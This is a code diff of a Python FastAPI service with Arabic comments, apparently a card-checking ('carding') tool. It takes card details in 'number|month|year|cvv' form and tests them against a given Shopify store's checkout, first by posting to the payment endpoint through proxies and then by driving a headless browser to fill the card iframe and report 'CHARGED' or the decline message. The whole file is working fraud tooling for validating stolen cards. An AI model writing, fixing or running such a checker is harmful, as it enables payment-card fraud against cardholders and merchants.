@@ -1,91 +1,72 @@
-from fastapi import FastAPI, Query, Request
-import httpx
+from fastapi import FastAPI, Query
+from playwright.async_api import async_playwright
+import uvicorn
 
 app = FastAPI()
 
-# Headers متوافقة تماماً مع متصفحات Shopify
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Referer": "",
-    "Origin": ""
-}
-
-@app.api_route("/check", methods=["GET", "POST"])
-async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
-    try:
-        if not site.startswith("http"):
-            site = f"https://{site}"
+@app.get("/check")
+async def check_card(cc: str = Query(...), site: str = Query(...)):
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
+        page = await context.new_page()
+        
+        try:
+            await page.goto(f"{site}/checkout")
+            cc_parts = cc.split('|')
             
-        request_headers = HEADERS.copy()
-        request_headers["Referer"] = f"{site}/"
-        request_headers["Origin"] = site
-
-        cc_parts = cc.split('|')
-        # بيانات البطاقة المطلوبة لـ Shopify Payments
-        payload = {
-            "card[number]": cc_parts[0],
-            "card[expiry_month]": cc_parts[1],
-            "card[expiry_year]": cc_parts[2],
-            "card[cvv]": cc_parts[3],
-            "amount": "31.0"
-        }
-
-        # معالج البروكسي
-        formatted_proxy = None
-        if proxy:
-            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
-            if "@" in clean_proxy:
-                formatted_proxy = f"http://{clean_proxy}"
-            else:
-                parts = clean_proxy.split(":")
-                if len(parts) == 4:
-                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-                else:
-                    formatted_proxy = f"http://{clean_proxy}"
-                    
-        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None
-
-        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
-            # المسار الرسمي لـ Shopify Payments
-            target_url = f"{site}/payments/authorize"
-            response = await client.post(target_url, data=payload)
+            # الدخول لـ iframe الخاص بـ Shopify
+            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
+            await frame.locator('input[name="number"]').fill(cc_parts[0])
+            await frame.locator('input[name="expiry"]').fill(f"{cc_parts[1]}/{cc_parts[2]}")
+            await frame.locator('input[name="verification_value"]').fill(cc_parts[3])
             
-            # تحليل الرد الخاص بـ Shopify
-            resp_msg = "CARD_DECLINED"
-            status = "false"
+            # الضغط على زر الدفع
+            await page.locator('button#continue-button').click()
             
+            # انتظار ظهور نتيجة (نص الخطأ أو صفحة النجاح)
             try:
-                data = response.json()
-                # Shopify يعيد غالباً message أو error في حال الرفض
-                if data.get("success") == True:
-                    resp_msg = "CHARGED"
-                    status = "true"
-                else:
-                    resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
+                await page.wait_for_selector('.notice--error, .field__message--error, .order-summary__section--product', timeout=15000)
             except:
-                resp_msg = "CARD_DECLINED"
+                pass
             
+            # تحليل الرد
+            content = await page.content().lower()
+            
+            # استخراج رسالة الخطأ الأصلية من الموقع
+            raw_error = ""
+            error_element = page.locator('.notice--error, .field__message--error').first
+            if await error_element.count() > 0:
+                raw_error = (await error_element.text_content()).strip()
+
+            # تحديد حالة الرد
+            if "thank-you" in page.url or "success" in content:
+                response = "CHARGED"
+                status = "true"
+            elif raw_error:
+                # إظهار الخطأ الأصلي كما هو من الموقع
+                response = raw_error
+                status = "false"
+            else:
+                response = "CARD_DECLINED"
+                status = "false"
+            
+            await browser.close()
             return {
-                "Gateway": "Shopify Payments",
-                "Price": "31.0",
-                "Proxy": "Live" if proxy else "None",
-                "Response": resp_msg,
-                "Status": status,
+                "Gateway": "Shopify Payments", 
+                "Response": response, 
+                "Status": status, 
+                "CC": cc
+            }
+            
+        except Exception as e:
+            await browser.close()
+            return {
+                "Gateway": "Shopify Payments", 
+                "Response": "CONN_ERROR", 
+                "Status": "false", 
                 "CC": cc
             }
 
-    except Exception as e:
-        return {
-            "Gateway": "Shopify Payments",
-            "Price": "31.0",
-            "Proxy": "Error",
-            "Response": "CARD_DECLINED",
-            "Status": "false",
-            "CC": cc
-        }
-
 if __name__ == "__main__":
-    import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8000)
